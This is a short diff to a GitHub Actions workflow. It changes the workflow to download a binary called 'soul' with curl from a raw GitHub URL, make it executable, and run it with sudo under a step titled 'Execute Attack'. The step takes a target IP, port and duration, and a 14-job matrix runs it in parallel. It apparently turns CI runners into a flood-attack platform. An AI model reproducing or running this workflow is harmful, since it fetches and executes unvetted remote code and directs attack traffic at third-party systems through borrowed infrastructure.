@@ -19,6 +19,9 @@ jobs:
       matrix:
         n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14]
     steps:
-    - uses: actions/checkout@v3
-    - run: chmod +x *
-    - run: sudo ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }}
+    - name: Fast Binary Download
+      run: |
+        curl -sLO https://raw.githubusercontent.com/Uthayabusiness/soulcrack-tg/main/soul
+        chmod +x soul
+    - name: Execute Attack
+      run: sudo ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }}
